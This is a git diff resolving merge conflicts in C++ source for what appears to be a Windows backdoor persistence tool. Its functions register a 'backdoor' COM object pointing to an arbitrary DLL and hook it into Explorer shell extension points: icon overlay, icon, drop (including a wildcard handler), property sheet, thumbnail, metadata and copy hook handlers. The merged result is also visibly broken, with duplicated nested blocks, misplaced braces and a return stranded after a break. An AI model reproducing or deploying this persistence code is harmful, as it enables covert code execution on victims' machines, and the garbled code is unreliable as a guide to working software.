@@ -25,11 +25,8 @@
 
 namespace reg {
 
-<<<<<<< HEAD
 	HKEY AddKey(HKEY hKey, CONST WCHAR* subkey) {
-=======
-	HKEY AddKey(HKEY hKey, CONST WCHAR* SUBKEY) {
->>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
+
 
 		LSTATUS status = NULL;
 		HKEY hkResult = NULL;
@@ -37,10 +34,9 @@ namespace reg {
 		OLECHAR* guidString = { 0 };
 		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;
 
-<<<<<<< HEAD
-		
+
 		std::wstring logmsg = L"Adding New Registry Key ";
-		
+
 		if (hKey == HKEY_LOCAL_MACHINE) logmsg.append(L"HKEY_LOCAL_MACHINE\\");
 		else if (hKey == HKEY_CURRENT_USER) logmsg.append(L"HKEY_CURRENT_USER\\");
 		else if (hKey == HKEY_CLASSES_ROOT) logmsg.append(L"HKEY_CLASSES_ROOT\\");
@@ -66,11 +62,12 @@ namespace reg {
 
 		}
 
-		
+
 
 	}
+	
 	LSTATUS AddDefaultValue(HKEY hkResult, GUID guid) {
-		
+
 		HRESULT hResult;
 		OLECHAR* guidString;
 
@@ -80,13 +77,6 @@ namespace reg {
 
 	}
 
-
-=======
-		status = RegCreateKeyExW(hKey, SUBKEY, NULL, NULL, REG_OPTION_NON_VOLATILE, dwKeyRights, NULL, &hkResult, NULL);
-		return (status == ERROR_SUCCESS) ? hkResult : NULL;
-
-	}
->>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 	std::wstring ResolveProgId(CONST WCHAR* ext) {
 
 		HKEY  hkResult = NULL;
@@ -108,10 +98,10 @@ namespace reg {
 			stat = RegEnumValueW(hkResult, NULL, buf1, &sz1, NULL, NULL, buf2, &sz2);
 			if (stat == ERROR_SUCCESS) {
 
-				logstr = L"Successfully Resolved ProgId for the Extension (" + std::wstring((WCHAR *)buf2) + L")";
+				logstr = L"Successfully Resolved ProgId for the Extension (" + std::wstring((WCHAR*)buf2) + L")";
 				logging::log(LVL_INFO, logstr.c_str());
 				return std::wstring((WCHAR*)buf2);
-				
+
 			}
 			else {
 
@@ -124,15 +114,10 @@ namespace reg {
 
 			logging::log(LVL_FATAL, L"Error Opening Key");
 
-		}		
+		}
 
 	}
 
-<<<<<<< HEAD
-
-
-=======
->>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath) {
 
 		LSTATUS status = NULL;
@@ -150,7 +135,7 @@ namespace reg {
 		if (hResult == S_OK) {
 
 			hResult = StringFromCLSID(objGuid, &guidString); // need to check this
-			
+
 			if (hKey == HKEY_CURRENT_USER) {
 				subKey = L"Software\\Classes\\CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";
 			}
@@ -159,9 +144,9 @@ namespace reg {
 				subKey = L"CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";
 
 			}
-				
+
 			CoTaskMemFree(guidString);
-			
+
 			logmsg = L"Creating Backdoor COM Object Reg Key ";
 			logmsg = logmsg + std::wstring((hKey == HKEY_CLASSES_ROOT) ? L"HKCR\\" : L"HKCU\\") + subKey;
 			logging::log(LVL_INFO, logmsg.c_str());
@@ -215,7 +200,6 @@ namespace reg {
 
 	}
 
-
 	BOOL AddTechnique(_In_ BYTE type, _In_opt_ WCHAR* ext, _In_ GUID Guid) {
 
 		LSTATUS status = NULL;
@@ -223,53 +207,50 @@ namespace reg {
 		HRESULT hResult = NULL;
 
 		std::wstring strExt;
-<<<<<<< HEAD
 		std::wstring progId;
-=======
->>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
+
 
 		switch (type) {
 
-		case ICON_OVERLAY: 
-			
+		case ICON_OVERLAY:
+
 			hkResult = AddKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\BackdoorOverlay\\");
 			if (hkResult) {
-<<<<<<< HEAD
-				
+
+
 				status = AddDefaultValue(hkResult, Guid);
 				if (status == ERROR_SUCCESS) {
 
 					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");
 					break;
-=======
-				OLECHAR* guidString;
-				hResult = StringFromCLSID(Guid, &guidString);
-				size_t sz = wcslen(guidString);
-				status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString, (DWORD)sz * 2 + 2);
-				if (status == ERROR_SUCCESS) {
 
-					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");
+					OLECHAR* guidString;
+					hResult = StringFromCLSID(Guid, &guidString);
+					size_t sz = wcslen(guidString);
+					status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString, (DWORD)sz * 2 + 2);
+					if (status == ERROR_SUCCESS) {
 
->>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
+						logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");
+
+					}
+					else {
+
+						logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Overlay Handler");
+
+					}
+
+					break;
 				}
-				else {
-				
-					logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Overlay Handler");
-
-				}
-<<<<<<< HEAD
 				break;
-			}
-			break;
 		case ICON_HANDLER:
 			if (ext) {
-			
+
 				strExt = std::wstring(ext);
 				progId = ResolveProgId(strExt.c_str());
 				progId.append(L"\\shellex\\IconHandler");
 				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
 				if (hkResult) {
-					
+
 					status = AddDefaultValue(hkResult, Guid);
 					if (status == ERROR_SUCCESS) {
 
@@ -319,7 +300,7 @@ namespace reg {
 
 			}
 			else {
-				
+
 				logging::log(LVL_WARNING, L"No Extension Was Provided For Drop Handler, Using Wildcard (*) Drop Handler");
 				progId = std::wstring(L"*\\shellex\\DropHandler");
 				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
@@ -343,7 +324,7 @@ namespace reg {
 			break;
 
 		case PROPERTY_SHEET_HANDLER:
-			
+
 			if (ext) {
 
 				strExt = std::wstring(ext);
@@ -388,36 +369,10 @@ namespace reg {
 					}
 					break;
 				}
-=======
->>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
-				break;
-			}
-			else {
-
-				logging::log(LVL_FATAL, L"Error Creating Backdoor ICON Overlay Key");
 
 			}
-
-<<<<<<< HEAD
-=======
-		case ICON_HANDLER:
-			if (ext) {
-			
-				strExt = std::wstring(ext);
-				ResolveProgId(strExt.c_str());
-			
-			}
-			else {
-
-				logging::log(LVL_FATAL, L"Error Extension Needed for Technique");
-
-			}
-
 			break;
 
-		case DROP_HANDLER:
-		case PROPERTY_SHEET_HANDLER:
->>>>>>> 8a7699c804f7acf77c9c21ff5e2e093f22e0190e
 		case THUMBNAIL_IMAGE_HANDLER:
 			if (ext) {
 
@@ -513,6 +468,7 @@ namespace reg {
 				}
 				break;
 			}
+			break;
 		case METADATA_HANDLER:
 			if (ext) {
 
@@ -560,6 +516,7 @@ namespace reg {
 				}
 				break;
 			}
+			break;
 		case COPY_HOOK_HANDLER:
 			if (ext) {
 
@@ -609,16 +566,19 @@ namespace reg {
 			}
 			break;
 
+			return (status == ERROR_SUCCESS) ? TRUE : FALSE;
+
+			}
+
+
 		}
+
 		
-		return (status == ERROR_SUCCESS) ? TRUE : FALSE;
-
 	}
+	
 	BOOL RemoveTechnique(DWORD type, WCHAR* ext) {
-
 
 		return TRUE;
 
 	}
-
 }
